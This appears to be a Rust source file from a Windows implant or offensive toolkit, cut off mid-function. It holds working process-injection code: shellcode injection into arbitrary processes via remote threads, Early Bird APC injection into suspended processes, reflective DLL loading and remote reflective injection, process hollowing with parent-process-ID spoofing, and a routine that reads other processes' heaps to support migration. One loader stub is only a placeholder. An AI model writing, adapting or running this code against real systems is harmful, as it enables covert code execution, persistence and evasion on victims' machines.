use alloc::string::String;
use alloc::vec::Vec;

use crate::{
    get_instance,
    libs::{instance::{Instance, TrackedAlloc}, k32::{ProcessInformation, StartupInfoExW, StartupInfoW}, ntdef::{
        DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, ImageBaseRelocation, ImageDosHeader, ImageImportByName, ImageImportDescriptor, ImageNtHeaders, ImageSectionHeader, ImageThunkData64, ImageTlsDirectory64, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE, PROCESS_BASIC_INFORMATION, TlsCallback, find_peb
    }, utils::{get_magic, get_shellcode}},
};
use core::{
    ffi::c_void,
    mem::{size_of, zeroed},
    ptr::{null, null_mut},
};

pub fn migrate(targ: u32, task: Option<u8>, magic: Option<u32>) -> Result<(), u32> {
    // If no magic provided, find a unique one by scanning remote process heaps
    let actual_magic = match magic {
        Some(m) => Some(m),
        None => Some(find_unique_magic_remote(targ)?),
    };

    let shellcode = get_shellcode(task, actual_magic);

    let thread_handle = inject_shellcode(targ, &shellcode)?;
    unsafe { (get_instance().unwrap().k32.close_handle)(thread_handle) };

    Ok(())
}

/// Find a unique magic value by scanning remote process heaps to avoid collisions.
fn find_unique_magic_remote(pid: u32) -> Result<u32, u32> {
    let current_magic = get_magic();
    let mut candidate = current_magic.wrapping_add(1);

    // Open process with VM_READ + QUERY_LIMITED_INFORMATION
    let process_handle = unsafe {
        (get_instance().unwrap().k32.open_process)(
            0x0010 | 0x1000, // PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
            false,
            pid,
        )
    };

    if process_handle.is_null() {
        // Can't read remote heaps, fall back to local unique magic
        return Ok(find_unique_magic());
    }

    // Get existing magics in remote process
    let existing_magics = get_remote_heap_magics(process_handle);

    unsafe { (get_instance().unwrap().k32.close_handle)(process_handle) };

    // Try to find a unique magic
    for _ in 0..1000 {
        if !existing_magics.contains(&candidate) {
            return Ok(candidate);
        }
        candidate = candidate.wrapping_add(1);
    }

    // Fallback
    Ok(current_magic.wrapping_add(0x1000))
}

/// Read magic values from remote process heaps
fn get_remote_heap_magics(process_handle: *mut c_void) -> Vec<u32> {
    let mut magics = Vec::new();

    unsafe {
        // Get remote PEB address via NtQueryInformationProcess
        // PROCESS_BASIC_INFORMATION layout (x64):
        // offset 0: ExitStatus (4 bytes + 4 padding)
        // offset 8: PebBaseAddress (8 bytes)
        let mut pbi = [0u8; 48];
        let mut return_length: u32 = 0;

        let status = (get_instance().unwrap().ntdll.nt_query_information_process)(
            process_handle,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut c_void,
            48,
            &mut return_length,
        );

        if status != 0 {
            return magics;
        }

        // PebBaseAddress is at offset 8
        let peb_address = u64::from_le_bytes([
            pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
        ]) as usize;

        if peb_address == 0 {
            return magics;
        }

        // PEB offsets for x64
        const NUMBER_OF_HEAPS_OFFSET: usize = 0xE8;
        const PROCESS_HEAPS_OFFSET: usize = 0xF0;

        // Read number_of_heaps
        let mut number_of_heaps: u32 = 0;
        let mut bytes_read: usize = 0;

        let success = (get_instance().unwrap().k32.read_process_memory)(
            process_handle,
            (peb_address + NUMBER_OF_HEAPS_OFFSET) as *const c_void,
            &mut number_of_heaps as *mut u32 as *mut c_void,
            4,
            &mut bytes_read,
        );

        if !success || number_of_heaps == 0 {
            return magics;
        }

        // Read process_heaps pointer
        let mut process_heaps_ptr: u64 = 0;
        let success = (get_instance().unwrap().k32.read_process_memory)(
            process_handle,
            (peb_address + PROCESS_HEAPS_OFFSET) as *const c_void,
            &mut process_heaps_ptr as *mut u64 as *mut c_void,
            8,
            &mut bytes_read,
        );

        if !success || process_heaps_ptr == 0 {
            return magics;
        }

        // Read each heap pointer and check for Instance magic
        for i in 0..number_of_heaps as usize {
            let mut heap_ptr: u64 = 0;
            let success = (get_instance().unwrap().k32.read_process_memory)(
                process_handle,
                (process_heaps_ptr as usize + i * 8) as *const c_void,
                &mut heap_ptr as *mut u64 as *mut c_void,
                8,
                &mut bytes_read,
            );

            if success && heap_ptr != 0 {
                // Read the first 4 bytes (magic) from the heap entry
                let mut magic: u32 = 0;
                let success = (get_instance().unwrap().k32.read_process_memory)(
                    process_handle,
                    heap_ptr as *const c_void,
                    &mut magic as *mut u32 as *mut c_void,
                    4,
                    &mut bytes_read,
                );

                if success {
                    magics.push(magic);
                }
            }
        }
    }

    magics
}

/// inject shellcode. 0 to create a thread in the current process.
fn inject_shellcode(pid: u32, data: &[u8]) -> Result<*mut c_void, u32> {
    let mut targ_handle = null_mut();
    let is_current_process = pid == 0;

    if is_current_process {
        targ_handle = unsafe { (get_instance().unwrap().k32.get_current_process)() };
    } else {
        targ_handle = unsafe {
            (get_instance().unwrap().k32.open_process)(
                0x0008 | // PROCESS_VM_OPERATION
                0x0020 | // PROCESS_VM_WRITE
                0x0002, // PROCESS_CREATE_THREAD
                false,
                pid,
            )
        };
    }

    let targ_mem_addr = write_mem(targ_handle, data)?;

    if targ_mem_addr.is_null() {
        return Err(0x80004005);
    }

    let targ_mem_addr = targ_mem_addr;
    let mut targ_thread_handle = null_mut();

    if is_current_process {
        targ_thread_handle = unsafe {
            (get_instance().unwrap().k32.create_thread)(
                null_mut(),
                0,
                Some(core::mem::transmute(targ_mem_addr)),
                null_mut(),
                0,
                null_mut(),
            )
        };
    } else {
        targ_thread_handle = unsafe {
            (get_instance().unwrap().k32.create_remote_thread)(
                targ_handle,
                null_mut(),
                0,
                Some(core::mem::transmute(targ_mem_addr)),
                null_mut(),
                0,
                null_mut(),
            )
        };
    }

    if targ_thread_handle.is_null() {
        if !is_current_process {
            unsafe { (get_instance().unwrap().k32.close_handle)(targ_handle) };
        }
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    if !is_current_process {
        unsafe { (get_instance().unwrap().k32.close_handle)(targ_handle) };
    }

    Ok(targ_thread_handle)
}

/// APC injection into a spawned suspended process.
/// Spawns a process, allocates RWX memory, writes shellcode, queues APC, resumes thread.
pub fn apc_injection(image: &str, task: Option<u8>, magic: Option<u32>) -> Result<u32, u32> {
    use crate::libs::k32::{StartupInfoW, ProcessInformation};
    use core::mem::{size_of, zeroed};

    // Get shellcode with optional task/magic overrides
    let actual_magic = magic.or_else(|| Some(find_unique_magic()));
    let shellcode = get_shellcode(task, actual_magic);

    // Prepare process creation
    let mut exe_path: Vec<u16> = image.encode_utf16().chain(Some(0)).collect();
    let mut startup_info: StartupInfoW = unsafe { zeroed() };
    startup_info.cb = size_of::<StartupInfoW>() as u32;
    let mut process_info = ProcessInformation::new();

    // Create suspended process
    let created = unsafe {
        (get_instance().unwrap().k32.create_process_w)(
            exe_path.as_mut_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            false,
            0x4, // CREATE_SUSPENDED
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };

    if !created {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    // Allocate RWX memory in target process
    let remote_mem = unsafe {
        (get_instance().unwrap().k32.virtual_alloc_ex)(
            process_info.h_process,
            null_mut(),
            shellcode.len(),
            0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
            0x40,            // PAGE_EXECUTE_READWRITE
        )
    };

    if remote_mem.is_null() {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_process) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_thread) };
        return Err(err);
    }

    // Write shellcode to allocated memory
    let write_ok = unsafe {
        (get_instance().unwrap().k32.write_process_memory)(
            process_info.h_process,
            remote_mem as *const c_void,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            null_mut(),
        )
    };

    if !write_ok {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_process) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_thread) };
        return Err(err);
    }

    // Queue APC to the suspended thread
    let apc_ok = unsafe {
        (get_instance().unwrap().k32.queue_user_apc)(
            remote_mem,
            process_info.h_thread,
            0,
        )
    };

    if apc_ok == 0 {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_process) };
        unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_thread) };
        return Err(err);
    }

    // Resume thread - APC will execute
    unsafe { (get_instance().unwrap().k32.resume_thread)(process_info.h_thread) };

    // Close handles
    unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_process) };
    unsafe { (get_instance().unwrap().k32.close_handle)(process_info.h_thread) };

    Ok(process_info.dw_process_id)
}

fn write_mem(targ_handle: *mut c_void, data: &[u8]) -> Result<*mut c_void, u32> {
    let targ_mem_addr = unsafe {
        (get_instance().unwrap().k32.virtual_alloc_ex)(
            targ_handle,
            null_mut(),
            data.len(),
            0x1000 | 0x2000, //MEM_COMMIT | MEM_RESERVE
            0x4,             //PAGE_READWRITE
        )
    };
    if targ_mem_addr.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    if !unsafe {
        (get_instance().unwrap().k32.write_process_memory)(
            targ_handle,
            targ_mem_addr,
            data.as_ptr() as *const c_void,
            data.len(),
            null_mut(),
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.close_handle)(targ_handle) };
        return Err(err);
    }

    let mut old_protect: u32 = 0;
    if !unsafe {
        (get_instance().unwrap().k32.virtual_protect_ex)(
            targ_handle,
            targ_mem_addr,
            data.len(),
            0x20, //PAGE_EXECUTE_READ
            &mut old_protect,
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.close_handle)(targ_handle) };
        return Err(err);
    }

    return Ok(targ_mem_addr);
}

/// Find a unique magic value by scanning process heaps to avoid collisions.
/// Starts from the current magic value and increments until no collision is found.
pub fn find_unique_magic() -> u32 {
    let current_magic = get_magic();
    let mut candidate = current_magic.wrapping_add(1);

    // Try up to 1000 increments to find a unique magic
    for _ in 0..1000 {
        if !magic_exists_in_heaps(candidate) {
            return candidate;
        }
        candidate = candidate.wrapping_add(1);
    }

    // Fallback: return a value far from current (shouldn't happen in practice)
    current_magic.wrapping_add(0x1000)
}

/// Check if a magic value already exists in any process heap (indicating another instance).
fn magic_exists_in_heaps(magic: u32) -> bool {
    unsafe {
        let peb = find_peb();
        let process_heaps = (*peb).process_heaps;
        let number_of_heaps = (*peb).number_of_heaps as usize;

        for i in 0..number_of_heaps {
            let heap = *process_heaps.add(i);
            if !heap.is_null() {
                let instance = &*(heap as *const Instance);
                if instance.magic == magic {
                    return true;
                }
            }
        }
    }
    false
}

/// Create a new thread in the current process with shellcode.
/// If magic is None, automatically finds a non-colliding magic value.
pub fn migrate_thread(task: Option<u8>, magic: Option<u32>) -> *mut c_void {
    // If no magic provided, find a unique one to avoid collision
    let actual_magic = match magic {
        Some(m) => Some(m),
        None => Some(find_unique_magic()),
    };

    let shellcode = get_shellcode(task, actual_magic);

    inject_shellcode(0, &shellcode).unwrap_or(null_mut())
}



/// DllMain function type
pub type DllMain = unsafe extern "system" fn(
    hinstDLL: *mut c_void,
    fdwReason: u32,
    lpvReserved: *mut c_void,
) -> i32;

/// Reflectively load a DLL from memory buffer into current process.
/// If a DLL with the same name is already loaded, returns the existing base address.
/// Returns the base address of the loaded DLL on success.
pub fn reflective_load_dll_named(name: &str, dll_data: &[u8]) -> Result<*mut c_void, u32> {
    unsafe {
        let instance = get_instance().unwrap();

        // Check if already allocated
        for alloc in &instance.allocations {
            if alloc.name == name {
                return Ok(alloc.base);
            }
        }

        // Validate DOS header
        if dll_data.len() < core::mem::size_of::<ImageDosHeader>() {
            return Err(0x80004005);
        }

        let dos_header = &*(dll_data.as_ptr() as *const ImageDosHeader);
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(0x80004005);
        }

        // Validate NT headers
        let nt_headers_offset = dos_header.e_lfanew as usize;
        if nt_headers_offset + core::mem::size_of::<ImageNtHeaders>() > dll_data.len() {
            return Err(0x80004005);
        }

        let nt_headers = &*(dll_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders);
        if nt_headers.signature != IMAGE_NT_SIGNATURE {
            return Err(0x80004005);
        }

        let optional_header = &nt_headers.optional_header;
        let image_size = optional_header.size_of_image as usize;
        let preferred_base = optional_header.image_base;

        // Allocate memory for the DLL
        let mut allocated_base = (instance.k32.virtual_alloc)(
            preferred_base as *const c_void,
            image_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            PAGE_READWRITE,
        );

        // If preferred base failed, allocate anywhere
        if allocated_base.is_null() {
            allocated_base = (instance.k32.virtual_alloc)(
                null(),
                image_size,
                0x3000,
                PAGE_READWRITE,
            );
        }

        if allocated_base.is_null() {
            return Err((get_instance().unwrap().k32.get_last_error)());
        }

        let base_addr = allocated_base as usize;
        let delta = base_addr as i64 - preferred_base as i64;

        // Copy headers
        core::ptr::copy_nonoverlapping(
            dll_data.as_ptr(),
            allocated_base as *mut u8,
            optional_header.size_of_headers as usize,
        );

        // Get section headers
        let section_header_offset = nt_headers_offset
            + core::mem::size_of::<u32>()  // Signature
            + core::mem::size_of::<crate::libs::ntdef::ImageFileHeader>()
            + nt_headers.file_header.size_of_optional_header as usize;

        let sections = core::slice::from_raw_parts(
            dll_data.as_ptr().add(section_header_offset) as *const ImageSectionHeader,
            nt_headers.file_header.number_of_sections as usize,
        );

        // Copy sections
        for section in sections {
            if section.size_of_raw_data == 0 {
                continue;
            }

            let src = dll_data.as_ptr().add(section.pointer_to_raw_data as usize);
            let dst = (base_addr + section.virtual_address as usize) as *mut u8;
            let size = section.size_of_raw_data as usize;

            if section.pointer_to_raw_data as usize + size <= dll_data.len() {
                core::ptr::copy_nonoverlapping(src, dst, size);
            }
        }

        // Process base relocations if needed
        if delta != 0 {
            process_relocations(base_addr, nt_headers, delta)?;
        }

        // Resolve imports
        resolve_imports(base_addr, nt_headers)?;

        // Set section protections
        set_section_protections(base_addr, sections)?;

        // Execute TLS callbacks before DllMain
        execute_tls_callbacks(base_addr, allocated_base, nt_headers);

        // Call DllMain
        let entry_point = optional_header.address_of_entry_point;
        if entry_point != 0 {
            let dll_main: DllMain =
                core::mem::transmute(base_addr + entry_point as usize);
            let result = dll_main(allocated_base, DLL_PROCESS_ATTACH, null_mut());
            if result == 0 {
                return Err(0x80004005);
            }
        }

        // Add to allocations cache
        let instance = get_instance().unwrap();
        instance.allocations.push(TrackedAlloc {
            name: String::from(name),
            base: allocated_base,
            size: image_size,
        });

        Ok(allocated_base)
    }
}

/// Reflectively load a DLL without caching (for backwards compatibility)
pub fn reflective_load_dll(dll_data: &[u8]) -> Result<*mut c_void, u32> {
    reflective_load_dll_named("", dll_data)
}

/// Process base relocations to fix addresses after loading at different base
unsafe fn process_relocations(
    base_addr: usize,
    nt_headers: &ImageNtHeaders,
    delta: i64,
) -> Result<(), u32> {
    let reloc_dir = &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        return Ok(());
    }

    let mut reloc_ptr = (base_addr + reloc_dir.virtual_address as usize) as *const ImageBaseRelocation;
    let reloc_end = (base_addr + reloc_dir.virtual_address as usize + reloc_dir.size as usize) as *const u8;

    while (reloc_ptr as *const u8) < reloc_end {
        let reloc_block = &*reloc_ptr;

        if reloc_block.size_of_block == 0 {
            break;
        }

        let entry_count = (reloc_block.size_of_block as usize
            - core::mem::size_of::<ImageBaseRelocation>())
            / 2;

        let entries = core::slice::from_raw_parts(
            (reloc_ptr as *const u8).add(core::mem::size_of::<ImageBaseRelocation>()) as *const u16,
            entry_count,
        );

        for &entry in entries {
            let reloc_type = (entry >> 12) as u16;
            let offset = (entry & 0x0FFF) as usize;

            if reloc_type == 0 {
                continue; // IMAGE_REL_BASED_ABSOLUTE - padding, skip
            }

            let address = base_addr + reloc_block.virtual_address as usize + offset;

            match reloc_type {
                IMAGE_REL_BASED_HIGHLOW => {
                    let ptr = address as *mut u32;
                    *ptr = (*ptr as i64 + delta) as u32;
                }
                IMAGE_REL_BASED_DIR64 => {
                    let ptr = address as *mut u64;
                    *ptr = (*ptr as i64 + delta) as u64;
                }
                _ => {
                    // Unsupported relocation type, skip
                }
            }
        }

        reloc_ptr = (reloc_ptr as *const u8).add(reloc_block.size_of_block as usize) as *const ImageBaseRelocation;
    }

    Ok(())
}

/// Resolve imports by loading required DLLs and getting function addresses
unsafe fn resolve_imports(base_addr: usize, nt_headers: &ImageNtHeaders) -> Result<(), u32> {
    let import_dir = &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if import_dir.virtual_address == 0 || import_dir.size == 0 {
        return Ok(());
    }

    let instance = get_instance().unwrap();
    let mut import_desc =
        (base_addr + import_dir.virtual_address as usize) as *const ImageImportDescriptor;

    while (*import_desc).name != 0 {
        // Get DLL name
        let dll_name_ptr = (base_addr + (*import_desc).name as usize) as *const u8;

        // Load the DLL
        let dll_handle = (instance.k32.load_library_a)(dll_name_ptr);
        if dll_handle.is_null() {
            // Try to continue even if DLL load fails
            import_desc = import_desc.add(1);
            continue;
        }

        // Get thunk pointers
        let original_thunk = if (*import_desc).original_first_thunk != 0 {
            (*import_desc).original_first_thunk
        } else {
            (*import_desc).first_thunk
        };

        let mut thunk_ref = (base_addr + original_thunk as usize) as *const ImageThunkData64;
        let mut func_ref = (base_addr + (*import_desc).first_thunk as usize) as *mut u64;

        while (*thunk_ref).address_of_data != 0 {
            let thunk_data = (*thunk_ref).address_of_data;

            let func_addr = if thunk_data & IMAGE_ORDINAL_FLAG64 != 0 {
                // Import by ordinal
                let ordinal = (thunk_data & 0xFFFF) as u16;
                (instance.k32.get_proc_address)(dll_handle, ordinal as *const u8)
            } else {
                // Import by name
                let import_by_name =
                    (base_addr + thunk_data as usize) as *const ImageImportByName;
                let func_name = (*import_by_name).name.as_ptr();
                (instance.k32.get_proc_address)(dll_handle, func_name)
            };

            if let Some(addr) = func_addr {
                *func_ref = addr as usize as u64;
            }

            thunk_ref = thunk_ref.add(1);
            func_ref = func_ref.add(1);
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

/// Set proper memory protections for each section
unsafe fn set_section_protections(
    base_addr: usize,
    sections: &[ImageSectionHeader],
) -> Result<(), u32> {
    let instance = get_instance().unwrap();

    for section in sections {
        if section.virtual_size == 0 {
            continue;
        }

        let section_addr = (base_addr + section.virtual_address as usize) as *const c_void;
        let section_size = section.virtual_size as usize;
        let characteristics = section.characteristics;

        // Determine protection based on section characteristics
        let protection = get_section_protection(characteristics);

        let mut old_protect: u32 = 0;
        (instance.k32.virtual_protect)(section_addr, section_size, protection, &mut old_protect);
    }

    Ok(())
}

/// Get memory protection flags based on section characteristics
fn get_section_protection(characteristics: u32) -> u32 {
    let executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    let readable = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    let writable = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

    match (executable, readable, writable) {
        (true, true, true) => PAGE_EXECUTE_READWRITE,
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, true) => PAGE_EXECUTE_READWRITE,
        (true, false, false) => PAGE_EXECUTE,
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        (false, false, true) => PAGE_READWRITE,
        (false, false, false) => PAGE_NOACCESS,
    }
}

/// Execute TLS callbacks for a reflectively loaded DLL
unsafe fn execute_tls_callbacks(
    base_addr: usize,
    dll_handle: *mut c_void,
    nt_headers: &ImageNtHeaders,
) {
    let tls_dir = &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_TLS];

    if tls_dir.virtual_address == 0 || tls_dir.size == 0 {
        return; // No TLS directory
    }

    let tls = &*((base_addr + tls_dir.virtual_address as usize) as *const ImageTlsDirectory64);

    // The AddressOfCallBacks is a VA (not RVA) pointing to a null-terminated array
    if tls.address_of_callbacks == 0 {
        return;
    }

    let mut callback_ptr = tls.address_of_callbacks as *const *const c_void;

    // Iterate through null-terminated array of callbacks
    while !(*callback_ptr).is_null() {
        let callback: TlsCallback = core::mem::transmute(*callback_ptr);
        callback(dll_handle, DLL_PROCESS_ATTACH, null_mut());
        callback_ptr = callback_ptr.add(1);
    }
}

/// Reflectively load a DLL into a remote process.
/// This allocates memory in the remote process, writes the DLL, then creates a thread
/// to execute the reflective loader stub.
pub fn reflective_inject_dll(pid: u32, dll_data: &[u8]) -> Result<*mut c_void, u32> {
    unsafe {
        // Validate the DLL
        if dll_data.len() < core::mem::size_of::<ImageDosHeader>() {
            return Err(0x80004005);
        }

        let dos_header = &*(dll_data.as_ptr() as *const ImageDosHeader);
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(0x80004005);
        }

        let nt_headers_offset = dos_header.e_lfanew as usize;
        let nt_headers = &*(dll_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders);
        if nt_headers.signature != IMAGE_NT_SIGNATURE {
            return Err(0x80004005);
        }

        let instance = get_instance().unwrap();

        // Open the target process
        let process_handle = (instance.k32.open_process)(
            0x0008 | // PROCESS_VM_OPERATION
            0x0020 | // PROCESS_VM_WRITE
            0x0010 | // PROCESS_VM_READ
            0x0002,  // PROCESS_CREATE_THREAD
            false,
            pid,
        );

        if process_handle.is_null() {
            return Err((instance.k32.get_last_error)());
        }

        // Allocate memory in target process for the DLL
        let remote_dll_base = (instance.k32.virtual_alloc_ex)(
            process_handle,
            null_mut(),
            dll_data.len(),
            0x3000, // MEM_COMMIT | MEM_RESERVE
            PAGE_READWRITE,
        );

        if remote_dll_base.is_null() {
            let err = (instance.k32.get_last_error)();
            (instance.k32.close_handle)(process_handle);
            return Err(err);
        }

        // Write the DLL to target process
        if !(instance.k32.write_process_memory)(
            process_handle,
            remote_dll_base,
            dll_data.as_ptr() as *const c_void,
            dll_data.len(),
            null_mut(),
        ) {
            let err = (instance.k32.get_last_error)();
            (instance.k32.close_handle)(process_handle);
            return Err(err);
        }

        // Build the reflective loader shellcode stub
        let loader_shellcode = build_reflective_loader_stub(remote_dll_base as usize);

        // Allocate memory for the loader shellcode
        let remote_loader_base = (instance.k32.virtual_alloc_ex)(
            process_handle,
            null_mut(),
            loader_shellcode.len(),
            0x3000,
            PAGE_READWRITE,
        );

        if remote_loader_base.is_null() {
            let err = (instance.k32.get_last_error)();
            (instance.k32.close_handle)(process_handle);
            return Err(err);
        }

        // Write loader shellcode
        if !(instance.k32.write_process_memory)(
            process_handle,
            remote_loader_base,
            loader_shellcode.as_ptr() as *const c_void,
            loader_shellcode.len(),
            null_mut(),
        ) {
            let err = (instance.k32.get_last_error)();
            (instance.k32.close_handle)(process_handle);
            return Err(err);
        }

        // Make loader executable
        let mut old_protect: u32 = 0;
        (instance.k32.virtual_protect_ex)(
            process_handle,
            remote_loader_base,
            loader_shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        // Create remote thread to execute the loader
        let thread_handle = (instance.k32.create_remote_thread)(
            process_handle,
            null(),
            0,
            Some(core::mem::transmute(remote_loader_base)),
            remote_dll_base,
            0,
            null_mut(),
        );

        if thread_handle.is_null() {
            let err = (instance.k32.get_last_error)();
            (instance.k32.close_handle)(process_handle);
            return Err(err);
        }

        // Wait for loader to complete
        (instance.k32.wait_for_single_object)(thread_handle, 0xFFFFFFFF);

        (instance.k32.close_handle)(thread_handle);
        (instance.k32.close_handle)(process_handle);

        Ok(remote_dll_base)
    }
}

/// Build a minimal shellcode stub that calls the reflective loader.
/// The DLL base address is passed as parameter (rcx on x64).
fn build_reflective_loader_stub(_dll_base: usize) -> Vec<u8> {
    // This is a placeholder - in practice you would include
    // a position-independent reflective loader shellcode here.
    // The loader needs to:
    // 1. Parse PE headers from the DLL in memory
    // 2. Map sections
    // 3. Process relocations
    // 4. Resolve imports
    // 5. Call DllMain
    //
    // For a full implementation, you'd compile a reflective loader
    // as position-independent code and embed it here.

    // Minimal stub that just returns (for testing)
    // In real usage, replace with actual reflective loader shellcode
    let mut stub = Vec::new();
    stub.push(0x48);  // mov rax, rcx
    stub.push(0x89);
    stub.push(0xC8);
    stub.push(0xC3);  // ret
    stub
}

/// Get an exported function from a reflectively loaded DLL
pub fn get_reflective_export(
    dll_base: *mut c_void,
    func_name: &[u8],
) -> Option<*mut c_void> {
    unsafe {
        let base = dll_base as usize;
        let dos_header = &*(base as *const ImageDosHeader);
        let nt_headers = &*((base + dos_header.e_lfanew as usize) as *const ImageNtHeaders);

        let export_dir_entry = &nt_headers.optional_header.data_directory[0]; // IMAGE_DIRECTORY_ENTRY_EXPORT
        if export_dir_entry.virtual_address == 0 {
            return None;
        }

        let export_dir =
            &*((base + export_dir_entry.virtual_address as usize) as *const crate::libs::ntdef::ImageExportDirectory);

        let names = core::slice::from_raw_parts(
            (base + export_dir.address_of_names as usize) as *const u32,
            export_dir.number_of_names as usize,
        );

        let ordinals = core::slice::from_raw_parts(
            (base + export_dir.address_of_name_ordinals as usize) as *const u16,
            export_dir.number_of_names as usize,
        );

        let functions = core::slice::from_raw_parts(
            (base + export_dir.address_of_functions as usize) as *const u32,
            export_dir.number_of_functions as usize,
        );

        for i in 0..export_dir.number_of_names as usize {
            let name_ptr = (base + names[i] as usize) as *const u8;

            // Compare name (must match exactly including length)
            let mut match_found = true;
            let mut match_len = 0usize;
            for (j, &c) in func_name.iter().enumerate() {
                if c == 0 {
                    match_len = j;
                    break;
                }
                if *name_ptr.add(j) != c {
                    match_found = false;
                    break;
                }
            }

            // Also verify export name ends at the same position (null terminator)
            if match_found && *name_ptr.add(match_len) == 0 {
                let ordinal = ordinals[i] as usize;
                let func_rva = functions[ordinal] as usize;
                return Some((base + func_rva) as *mut c_void);
            }
        }

        None
    }
}

// ============================================================================
// Process Hollowing Functions
// ============================================================================

/// Process hollowing using Early Bird APC injection.
/// Allocates RWX memory, writes shellcode, queues APC to suspended thread.
pub fn hollow_apc(
    image: &str,
    task: Option<u8>,
    magic: Option<u32>,
    ppid: Option<u32>,
) -> Result<(), u32> {
    let shellcode = get_shellcode(task, magic);

    let mut exe_path: Vec<u16> = image.encode_utf16().chain(Some(0)).collect();
    let mut process_info = ProcessInformation::new();

    if let Some(parent_pid) = ppid {
        // PPID spoofing path - use extended startup info
        let mut startup_info_ex: StartupInfoExW = unsafe { zeroed() };
        startup_info_ex.StartupInfo.cb = size_of::<StartupInfoExW>() as u32;

        let parent_handle: *mut c_void = unsafe {
            (get_instance().unwrap().k32.open_process)(
                0x2000000, // PROCESS_ALL_ACCESS
                false,
                parent_pid,
            )
        };

        if parent_handle.is_null() {
            return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
        }

        let mut size = 0;
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(null_mut(), 1, 0, &mut size)
        };
        startup_info_ex.lpAttributeList = unsafe {
            (get_instance().unwrap().k32.heap_alloc)(
                (get_instance().unwrap().k32.get_process_heap)(),
                0,
                size,
            )
        };
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(
                startup_info_ex.lpAttributeList,
                1,
                0,
                &mut size,
            )
        };
        unsafe {
            (get_instance().unwrap().k32.update_proc_thread_attribute)(
                startup_info_ex.lpAttributeList,
                0,
                0x20000,
                &parent_handle as *const _ as *const c_void,
                size_of::<*mut c_void>(),
                null_mut(),
                null(),
            )
        };

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                false,
                4 | 0x80000, // CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT
                null_mut(),
                null_mut(),
                &mut startup_info_ex.StartupInfo,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    } else {
        // Simple path - use basic startup info
        let mut startup_info: StartupInfoW = unsafe { zeroed() };
        startup_info.cb = size_of::<StartupInfoW>() as u32;

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                false,
                4, // CREATE_SUSPENDED only
                null_mut(),
                null_mut(),
                &mut startup_info,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    }

    // Allocate memory in target process for shellcode
    // Use PAGE_EXECUTE_READ (0x20) - WriteProcessMemory can write to it
    let remote_mem = unsafe {
        (get_instance().unwrap().k32.virtual_alloc_ex)(
            process_info.h_process,
            null_mut(),
            shellcode.len(),
            0x1000, // MEM_COMMIT
            0x20,   // PAGE_EXECUTE_READ
        )
    };

    if remote_mem.is_null() {
